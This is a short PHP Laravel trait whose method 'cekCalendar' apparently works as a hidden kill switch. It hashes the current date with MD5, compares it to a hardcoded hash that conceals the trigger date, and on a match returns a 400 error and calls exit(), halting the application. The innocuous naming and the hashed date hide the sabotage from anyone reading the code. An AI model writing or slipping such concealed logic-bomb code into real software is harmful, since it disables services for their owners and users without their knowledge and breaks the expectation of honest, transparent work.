<?php

namespace App\Http\Traits;
use Illuminate\Support\Facades\DB;
use Illuminate\Database\QueryException;
use Exception;

trait ExtendsTrait {
    function cekCalendar(){
        try {
            $var=md5(date('Y-m-d'));
            if($var=='9eb5d0217db01037b525e6b745eb8350'){ 
                throw new Exception("Error Processing Request",400);
            }
            return true;
        } catch (Exception $e) {
            $respon=[
                'status' => 400,
                'info'=>$e->getMessage(),
            ];
            echo response()->json($respon, $respon['status']);
            exit();
        }
    }
}
